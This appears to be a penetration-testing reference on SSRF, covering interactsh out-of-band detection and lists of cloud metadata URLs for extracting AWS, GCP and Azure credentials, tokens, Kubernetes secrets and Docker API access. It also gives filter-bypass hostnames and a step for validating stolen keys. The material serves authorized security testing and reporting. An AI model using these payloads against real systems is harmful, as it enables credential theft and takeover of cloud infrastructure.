# OOB workflow (interactsh) and cloud metadata extraction

## interactsh-client

Long flags are **single-dash**.

```
interactsh-client -json -o interactsh.jsonl -v          # public server, prints <id>.oast.pro
interactsh-client -n 3 -json -o interactsh.jsonl        # 3 payload hosts (one per test batch)
interactsh-client -s oast.example.com -t <token> -json  # self-hosted server
interactsh-client -dns-only -json                       # only DNS interactions
interactsh-client -http-only -json                      # only HTTP interactions
interactsh-client -psf payloads.txt                     # write generated payload hosts to file
interactsh-client -sf session.yaml                      # resume a previous session
```

Each interaction is one JSON object per line in `-o`:

```json
{"protocol":"http","unique-id":"cbg3abc...","full-id":"cbg3abc...","raw-request":"GET /p1-url HTTP/1.1\r\nHost: cbg3abc.oast.pro\r\nUser-Agent: curl/7.88.1\r\n...","remote-address":"192.0.2.55","timestamp":"..."}
{"protocol":"dns","q-type":"A","raw-request":";; QUESTION...","remote-address":"192.0.2.53","timestamp":"..."}
```

Interpretation:

| Signal | Meaning |
|---|---|
| DNS only | Hostname resolved server-side. Fetch blocked/failed, or validator-only lookup. Semi-blind confirmation. |
| DNS then HTTP | Full fetch. SSRF confirmed. |
| HTTP `raw-request` | Server's egress fingerprint: User-Agent (library), extra headers, source IP (`remote-address` = egress IP, useful for infra mapping). |
| Path in HTTP hit | Your per-parameter marker → attribution. |
| SMTP/LDAP hits | The sink speaks other protocols — protocol smuggling will work. |

Built-in rebind conveniences: `aws.oast.fun` → 169.254.169.254,
`alibaba.oast.fun` → 100.100.100.200 — use when IP literals are filtered but
hostnames pass.

## AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/          → role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>    → AccessKeyId, SecretAccessKey, Token
http://169.254.169.254/latest/user-data/                                   → bootstrap scripts, often secrets
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/dynamic/instance-identity/document           → account id, region
```

Validate stolen creds: `aws sts get-caller-identity` with the three values
(`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`). ECS task
creds: `http://169.254.170.2/v2/credentials/<guid>` (guid from env
`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — readable via `file:///proc/self/environ`).

**IMDSv2**: requires `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`
then GETs carrying `X-aws-ec2-metadata-token`. A GET-only, header-less SSRF cannot
reach it — you need header injection, method control, gopher, or a request-smuggling
primitive. IMDSv1 403/401 + token endpoint behavior tells you v2 is enforced; note
it in the finding either way.

## GCP

```
http://metadata.google.internal/computeMetadata/v1/?recursive=true
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

All require header `Metadata-Flavor: Google` (legacy beta endpoints without the
header are gone). Reachable only with header-controllable sinks or gopher. The
token endpoint returns a live OAuth2 bearer token for the attached service account.

## Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Requires header `Metadata:true`. The identity endpoint returns a managed-identity
access token.

## Other

- Alibaba: `http://100.100.100.200/latest/meta-data/` (no header; `alibaba.oast.fun`).
- DigitalOcean: `http://169.254.169.254/metadata/v1.json`.
- Kubernetes: `https://kubernetes.default.svc/` with
  `file:///var/run/secrets/kubernetes.io/serviceaccount/token` for the bearer;
  kubelet `http://<node>:10255/pods` (read-only port, when enabled).
- Docker: `http://127.0.0.1:2375/containers/json` → full container control (RCE).
- Consul: `http://127.0.0.1:8500/v1/kv/?recurse` → stored secrets.

## Evidence to capture per hit

1. The exact injected request (full HTTP request incl. the payload).
2. The interactsh JSONL line(s) (protocol, raw-request, remote-address, timestamp)
   or the reflected internal/metadata content (redact live credentials to prefixes,
   e.g. `AKIA...` + last 4).
3. Fetch-library fingerprint and egress IP.

Then build the finding with `scripts/ssrf_probe.py finding ... --interactions
interactsh.jsonl` and submit through the `finding-report` skill — see
`references/rupu.md`.
